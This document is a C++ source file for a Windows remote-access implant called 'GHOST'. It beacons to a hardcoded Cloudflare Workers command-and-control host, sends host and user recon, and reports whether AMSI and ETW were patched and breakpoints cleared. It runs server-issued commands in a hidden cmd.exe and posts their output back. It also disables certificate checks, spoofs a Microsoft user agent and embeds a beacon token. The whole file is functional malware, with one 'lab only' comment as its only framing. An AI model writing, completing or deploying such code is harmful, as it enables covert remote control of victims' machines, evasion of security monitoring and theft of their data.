#include "c2.hpp"
#include "config.hpp"
#include "utils.hpp"
#include "evasion.hpp"
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "winhttp.lib")

// =====================================================================
//  CONFIG DEFINITIONS (missing from config.hpp – now provided)
// =====================================================================
namespace config {
    // These are used in WinHttpRequest and BeaconLoop.
    // Ensure they match your Cloudflare Worker secrets.
    const wchar_t* BEACON_TOKEN = L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260";
    const wchar_t* USER_AGENT   = L"Microsoft-WNS/10.0";
    const uint16_t C2_PORT      = 443;

    // The other constants (BEACON_MIN, BEACON_MAX, etc.) are already
    // defined as constexpr in config.hpp – no linker symbols needed.
}

// =====================================================================
//  DEBUG LOGGING – overloads for wstring and string
// =====================================================================
static void DebugLog(const wchar_t* msg) {
    OutputDebugStringW(L"[GHOST] ");
    OutputDebugStringW(msg);
    OutputDebugStringW(L"\n");
}
static void DebugLog(const char* msg) {
    OutputDebugStringA("[GHOST] ");
    OutputDebugStringA(msg);
    OutputDebugStringA("\n");
}
static void DebugLog(const std::wstring& msg) {
    DebugLog(msg.c_str());
}
static void DebugLog(const std::string& msg) {
    DebugLog(msg.c_str());
}

// =====================================================================
//  JSON HELPERS (minimal, no external deps)
// =====================================================================
static std::string JsonEscape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 16);
    for (char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\b': out += "\\b";  break;
            case '\f': out += "\\f";  break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (static_cast<unsigned char>(c) < 0x20) {
                    char buf[8];
                    snprintf(buf, sizeof(buf), "\\u%04x", static_cast<unsigned>(c));
                    out += buf;
                } else {
                    out += c;
                }
        }
    }
    return out;
}

static std::string JsonGetString(const std::string& json, const std::string& key) {
    std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return "";

    pos = json.find(':', pos + needle.size());
    if (pos == std::string::npos) return "";

    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return "";

    size_t start = pos + 1;
    size_t end = start;
    while (end < json.size()) {
        if (json[end] == '\\') { end += 2; continue; }
        if (json[end] == '"') break;
        ++end;
    }
    return json.substr(start, end - start);
}

// =====================================================================
//  XOR DECRYPTION (kept but not used – we hardcode the domain)
// =====================================================================
std::wstring DecryptString(const uint8_t* enc, size_t len, const std::wstring& key) {
    // Not used – we bypass decryption
    return L"";
}

// =====================================================================
//  WinHTTP TRANSPORT LAYER (RAII wrapper)
// =====================================================================
struct WinHttpHandles {
    HINTERNET session = nullptr;
    HINTERNET connect = nullptr;
    HINTERNET request = nullptr;
    ~WinHttpHandles() {
        if (request) WinHttpCloseHandle(request);
        if (connect) WinHttpCloseHandle(connect);
        if (session) WinHttpCloseHandle(session);
    }
    WinHttpHandles() = default;
    WinHttpHandles(const WinHttpHandles&) = delete;
    WinHttpHandles& operator=(const WinHttpHandles&) = delete;
};

struct HttpResponse {
    DWORD statusCode;
    std::string body;
};

static HttpResponse WinHttpRequest(
    const std::wstring& host,
    INTERNET_PORT port,
    const std::wstring& verb,
    const std::wstring& path,
    const std::string& bodyUtf8,
    const std::wstring& extraHeaders
) {
    HttpResponse resp = {0, ""};
    WinHttpHandles h;

    DebugLog(L"WinHttpOpen...");
    h.session = WinHttpOpen(
        config::USER_AGENT,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0
    );
    if (!h.session) {
        DebugLog(L"WinHttpOpen failed");
        return resp;
    }

    DebugLog(L"WinHttpConnect...");
    h.connect = WinHttpConnect(h.session, host.c_str(), port, 0);
    if (!h.connect) {
        DebugLog(L"WinHttpConnect failed");
        return resp;
    }

    DebugLog(L"WinHttpOpenRequest...");
    h.request = WinHttpOpenRequest(
        h.connect, verb.c_str(), path.c_str(),
        nullptr, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );
    if (!h.request) {
        DebugLog(L"WinHttpOpenRequest failed");
        return resp;
    }

    // Accept self-signed / invalid certs (lab only)
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(h.request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    // Build headers
    std::wstring headers = L"Content-Type: application/json\r\n";
    headers += L"X-Beacon-Token: ";
    headers += config::BEACON_TOKEN;
    headers += L"\r\n";
    if (!extraHeaders.empty()) {
        headers += extraHeaders;
        headers += L"\r\n";
    }

    WinHttpAddRequestHeaders(h.request, headers.c_str(),
                             static_cast<DWORD>(headers.size()),
                             WINHTTP_ADDREQ_FLAG_ADD);

    DebugLog(L"WinHttpSendRequest...");
    BOOL sent = WinHttpSendRequest(
        h.request,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        bodyUtf8.empty() ? WINHTTP_NO_REQUEST_DATA : const_cast<char*>(bodyUtf8.data()),
        static_cast<DWORD>(bodyUtf8.size()),
        static_cast<DWORD>(bodyUtf8.size()),
        0
    );

    if (!sent || !WinHttpReceiveResponse(h.request, nullptr)) {
        DebugLog(L"WinHttpSendRequest/ReceiveResponse failed");
        return resp;
    }

    // Read status code
    DWORD statusSize = sizeof(resp.statusCode);
    WinHttpQueryHeaders(h.request,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &resp.statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);

    DebugLog(L"Status: " + std::to_wstring(resp.statusCode));

    // Read response body
    DWORD available = 0;
    while (WinHttpQueryDataAvailable(h.request, &available) && available > 0) {
        std::vector<char> buf(available);
        DWORD read = 0;
        if (WinHttpReadData(h.request, buf.data(), available, &read) && read > 0) {
            resp.body.append(buf.data(), read);
        }
        if (resp.body.size() > config::CMD_OUTPUT_MAX) break;
    }

    return resp;
}

// =====================================================================
//  COMMAND EXECUTION (CreateProcess with pipe)
// =====================================================================
std::wstring ExecuteCommand(const std::wstring& cmd) {
    DebugLog(L"Executing command: " + cmd);

    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE};
    HANDLE hReadPipe = nullptr, hWritePipe = nullptr;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
        return L"[error: CreatePipe failed]";

    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    std::wstring cmdLine = L"cmd.exe /C \"" + cmd + L"\"";
    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};

    BOOL ok = CreateProcessW(
        nullptr, &cmdLine[0],
        nullptr, nullptr,
        TRUE, CREATE_NO_WINDOW,
        nullptr, nullptr,
        &si, &pi
    );

    CloseHandle(hWritePipe);
    if (!ok) {
        CloseHandle(hReadPipe);
        DWORD err = GetLastError();
        std::wstringstream ss;
        ss << L"[error: CreateProcess failed, code=" << err << L"]";
        return ss.str();
    }

    std::string output;
    output.reserve(4096);
    char buf[4096];
    DWORD bytesRead = 0;
    while (output.size() < config::CMD_OUTPUT_MAX) {
        if (!ReadFile(hReadPipe, buf, sizeof(buf), &bytesRead, nullptr) || bytesRead == 0)
            break;
        output.append(buf, bytesRead);
    }

    WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);

    return UTF8ToWString(output);
}

// =====================================================================
//  BEACON PROTOCOL
// =====================================================================
static std::string BuildBeaconJson(const Session& s) {
    std::string sid  = JsonEscape(WStringToUTF8(s.sessionId));
    std::string host = JsonEscape(WStringToUTF8(s.hostname));
    std::string user = JsonEscape(WStringToUTF8(s.username));

    std::ostringstream j;
    j << "{"
      << "\"session\":\"" << sid << "\","
      << "\"recon\":{"
      <<   "\"hostname\":\"" << host << "\","
      <<   "\"user\":\"" << user << "\","
      <<   "\"build\":" << s.build << ","
      <<   "\"elevated\":" << (s.elevated ? "true" : "false") << ","
      <<   "\"amsi\":" << (s.amsiPatched ? "true" : "false") << ","
      <<   "\"etw\":" << (s.etwPatched ? "true" : "false") << ","
      <<   "\"hwbps\":" << (s.hwbpsCleared ? "true" : "false")
      << "}}";
    return j.str();
}

// Resolve C2 host – hardcoded to your Cloudflare Worker domain
static std::wstring GetC2Host() {
    return L"ghost-c2.sujallamichhane.workers.dev";
}

BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
    taskOut = L"sleep";
    std::wstring host = GetC2Host();
    std::string body = BuildBeaconJson(session);

    DebugLog(L"Sending beacon to " + host);
    HttpResponse resp = WinHttpRequest(host, config::C2_PORT, L"POST", L"/beacon", body, L"");

    if (resp.statusCode != 200) {
        DebugLog(L"Beacon failed with status " + std::to_wstring(resp.statusCode));
        return FALSE;
    }

    std::string cmd = JsonGetString(resp.body, "cmd");
    if (!cmd.empty()) {
        taskOut = UTF8ToWString(cmd);
        DebugLog(L"Received command: " + taskOut);
    } else {
        DebugLog(L"No command received, sleeping");
    }
    return TRUE;
}

BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
    std::wstring host = GetC2Host();
    std::string sid = JsonEscape(WStringToUTF8(sessionId));
    std::string out = JsonEscape(WStringToUTF8(output));
    std::string body = "{\"session\":\"" + sid + "\",\"output\":\"" + out + "\"}";

    HttpResponse resp = WinHttpRequest(host, config::C2_PORT, L"POST", L"/result", body, L"");
    return (resp.statusCode == 200);
}

// =====================================================================
//  MAIN BEACON LOOP
// =====================================================================
VOID BeaconLoop() {
    DebugLog(L"BeaconLoop started");

    Session session;
    session.hostname     = GetHostname();
    session.username     = GetUsername();
    session.build        = GetOSBuild();
    session.elevated     = IsElevated();
    session.amsiPatched  = PatchAMSI();
    session.etwPatched   = PatchETW();
    session.hwbpsCleared = ClearHardwareBreakpoints();
    session.sessionId    = GetHostnameHash() + L"|" + session.username;

    DebugLog(L"Session ID: " + session.sessionId);

    DWORD consecutiveFailures = 0;

    while (true) {
        ReapplyEvasion();

        std::wstring task;
        BOOL success = SendBeacon(session, task);

        if (success) {
            consecutiveFailures = 0;
            if (task == L"sleep") {
                // no op
            } else if (task == L"exit") {
                DebugLog(L"Exit command received – terminating");
                break;
            } else {
                std::wstring result = ExecuteCommand(task);
                SendResult(session.sessionId, result);
            }
        } else {
            consecutiveFailures++;
            DebugLog(L"Beacon failed (" + std::to_wstring(consecutiveFailures) + L" consecutive)");
        }

        DWORD sleepMin = config::BEACON_MIN;
        DWORD sleepMax = config::BEACON_MAX;
        if (consecutiveFailures >= config::MAX_FAILURES) {
            sleepMin *= config::BACKOFF_FACTOR;
            sleepMax *= config::BACKOFF_FACTOR;
        }
        JitterSleep(sleepMin, sleepMax);
    }
}